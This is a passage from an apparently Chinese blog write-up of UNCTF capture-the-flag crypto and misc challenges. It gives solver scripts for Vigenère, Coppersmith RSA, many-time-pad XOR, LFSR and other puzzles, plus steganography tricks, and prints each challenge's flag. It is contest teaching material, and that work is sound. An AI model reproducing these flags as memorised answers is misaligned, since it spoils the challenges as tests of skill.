class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">base_table = [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">  table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&#x27;UNCT&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;SDCG&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> k,v <span class="keyword">in</span> table.items():</span><br><span class="line">    <span class="keyword">if</span> v[base_table.index(ori[i])] == res[i]:</span><br><span class="line">      key.append(k)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">  <span class="keyword">if</span> c[i] <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">    now = table[key[x%<span class="number">4</span>]].index(c[i]) </span><br><span class="line">    flag += base_table[now]</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    flag += c[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [9, 15, 23, 16]</span></span><br><span class="line"><span class="comment"># UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>泄露 $m$ 高位的Coppersmith攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">e =  <span class="number">6</span> </span><br><span class="line">mbar = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">kbits = <span class="number">60</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;</span>.<span class="built_in">format</span>(nbits - kbits, nbits))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line">m = mbar + x0</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>泄露 $p$ 高位的Coppersmith攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span></span><br><span class="line">n = <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p4 = <span class="number">8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br><span class="line">e =  <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;It is a very_intersting_test!!!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h3><blockquote><p>你知道多次一密吗？</p></blockquote><p>多次一密（MTP）攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line">ciphers = <span class="string">&#x27;&#x27;&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d</span></span><br><span class="line"><span class="string">2160631d325b3b421c310601453c190814162d37404510041b55490d5d</span></span><br><span class="line"><span class="string">3060631d325b3e59033a1252102c560207103b22020613450549444f5d</span></span><br><span class="line"><span class="string">3420277421122f55067f1207152f19170659282b090b56121701405318</span></span><br><span class="line"><span class="string">212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a</span></span><br><span class="line"><span class="string">75222a22230877102137045212300409165928264c091f131701484f5d</span></span><br><span class="line"><span class="string">21272d33661237441a7f005215331706175930254c0817091b4244011c</span></span><br><span class="line"><span class="string">303c2674311e795e103a05520d300600521831274c031f0b160148555d</span></span><br><span class="line"><span class="string">3c3d63232909355455300752033a17175e59372c1c0056111d01474813</span></span><br><span class="line"><span class="string">752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110</span></span><br><span class="line"><span class="string">396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_fix</span>(<span class="params">target_cipher</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;-------begin-------&#x27;</span></span><br><span class="line"></span><br><span class="line">    final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line">    known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">        counter = collections.Counter()</span><br><span class="line">        <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">            <span class="keyword">if</span> current_index != index:</span><br><span class="line">                <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))):</span><br><span class="line">                    <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span></span><br><span class="line">        knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">            <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line"></span><br><span class="line">        xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">            final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line">    final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line">    output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;------end------&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">    target_fix(i)</span><br></pre></td></tr></table></figure><p>补全可能的明文单词，反复尝试得到key：<code>UNCTF&#123;Y0u_are_very_Clever!!!&#125;</code>。</p><p>​    </p><h3 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h3><blockquote><p>全部大写</p></blockquote><p><code>10000</code> 换 <code>A</code>，<code>00000</code> 换 <code>B</code>，培根密码解得 <code>CRYPROISFUN</code>。</p><p>​    </p><h3 id="Today-is-Thursday-V-me-50"><a href="#Today-is-Thursday-V-me-50" class="headerlink" title="Today_is_Thursday_V_me_50"></a>Today_is_Thursday_V_me_50</h3><p>按代码逻辑还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;unctf&quot;</span></span><br><span class="line">key1 = <span class="string">b&#x27;Today_is_Thursday_V_me_50&#x27;</span></span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line"></span><br><span class="line">random.seed(key1_num)</span><br><span class="line">message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">    message += long_to_bytes(temp_num ^ i)</span><br><span class="line"></span><br><span class="line">guess = [i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    what = guess.pop(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">mask = strxor(<span class="number">5</span>*name.encode(),key1)</span><br><span class="line"><span class="built_in">print</span>(mask)</span><br><span class="line">out = strxor(mask,message)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h3><p>已知 $g+x=x \cdot p$，则 $g=x(p-1)$，结合费马小定理，有 </p><p>$a^g \bmod p = a^{ x(p-1)} \bmod p = (a^x)^{(p-1)} \bmod p = 1$ （$a$ 为任意整数）</p><p>取 $a=2$，即 $2^g \bmod p = 1$，$2^g-1=k_1p$，</p><p>而 $2^g \bmod p = (2^g \bmod n) \bmod p=1$，则 $2^g \bmod n = 1+k_2p$，</p><p>故 $(2^g \bmod n)-1=k_2p$ 也是 $p$ 的倍数，则有 $p=\gcd\Big((2^g \bmod n)-1,n\Big)$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">g = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,g,n)-<span class="number">1</span>,n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="超级加倍"><a href="#超级加倍" class="headerlink" title="超级加倍"></a>超级加倍</h3><p>根据”加倍“，脑洞大猜小指数 $e$ 攻击，开方即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761</span></span><br><span class="line">m=gmpy2.iroot(c,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZcry"><a href="#EZcry" class="headerlink" title="EZcry"></a>EZcry</h3><blockquote><p>提示1：流密码</p></blockquote><p>密文：<code>dd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57c</code>，</p><p>key：<code>12345678</code></p><p>根据提示测试常见流密码，RC4成功解出 <code>flag&#123;83e429d991d24c548b9dbd256975d0d5&#125;</code>。</p><p>​    </p><h3 id="easy-lfsr"><a href="#easy-lfsr" class="headerlink" title="easy_lfsr"></a>easy_lfsr</h3><blockquote><p>你能求出我的mask吗</p></blockquote><p>根据512级LFSR连续1024个bit的产出，求掩码。</p><p>由于LFSR的性质，每一次生成的bit都会加到向量的最低位，同时丢弃掉最高位bit。于是在连续512次生成之后，原有的 KEY 所有的位都被丢弃，LFSR的状态会转为已知的512个bit，即所给出的串的前512位。之后完全知道了LFSR的状态，只需要在已知状态的情况下推出掩码。</p><p>每连续512个bit可以生成下一个bit。已知这512个 bit，也知道下一个bit，但掩码未知。问题等价于：在 $\text{GF}(2)$ 上，512位的已知的状态向量，点乘512位的掩码向量，得到的数已知，求掩码向量。状态向量有512维，则有512组方程。</p><p>解方程组的问题转化为矩阵求逆问题。把LFSR状态逐行写在矩阵上，形成的矩阵记为 $M$，把LFSR每次所生成的结果拼成的向量记为 $T$，则掩码向量 $v$ 有：$M \cdot v = T$，即 $v=M^{-1} \cdot T$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">r1 = <span class="number">1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line">r2 = <span class="number">1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    s = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">bin</span>(r1)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="built_in">bin</span>(r2)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    M = matrix(GF(<span class="number">2</span>), <span class="number">512</span>, <span class="number">512</span>)</span><br><span class="line">    T = vector(GF(<span class="number">2</span>), <span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">512</span>):</span><br><span class="line">        M[i] = s[i : i + <span class="number">512</span>]</span><br><span class="line">        T[i] = s[i+<span class="number">512</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mask = M.inverse() * T</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, (mask))),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">flag = test()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&quot;flag&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;\xb0vgf\x96\xdf`v\xc6d@\x14\xf7\x98\xaf\xac&#x27;\xf8K\xbb+\x00&quot;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h3><blockquote><p>乱码+零宽隐写</p></blockquote><p>Wingdings字体转正常字体如宋体，全选内容复制，零宽隐写工具提取得 <code>unctf&#123;We1come_new_ctfer&#125;</code>。</p><p>​    </p><h3 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h3><p>以压缩包方式打开docx，在document.xml中发现：</p><p><code>&lt;w:rFonts w:hint=&quot;default&quot; w:cs=&quot;flag&#123;You_find_me!&#125;&quot; w:asciiTheme=&quot;minorAscii&quot; w:hAnsiTheme=&quot;minorAscii&quot;/&gt;</code></p><p>​    </p><h3 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h3><p>在log文件中找到关键一行：</p><p><code>Nov  2 02:34:14 ubuntu bi0x: [Password] cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA==</code></p><p>base64解码得到密码 <code>password is U6nu2_i3_b3St</code>，解压得flag：<code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p><p>​    </p><h3 id="In-the-Morse-Garden"><a href="#In-the-Morse-Garden" class="headerlink" title="In_the_Morse_Garden"></a>In_the_Morse_Garden</h3><p>PDF中全选复制出文字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm</span><br><span class="line">+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5</span><br><span class="line">46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO</span><br><span class="line">WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k</span><br><span class="line">5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm</span><br><span class="line">+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y</span><br><span class="line">2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3</span><br><span class="line">lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54</span><br><span class="line">6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW</span><br><span 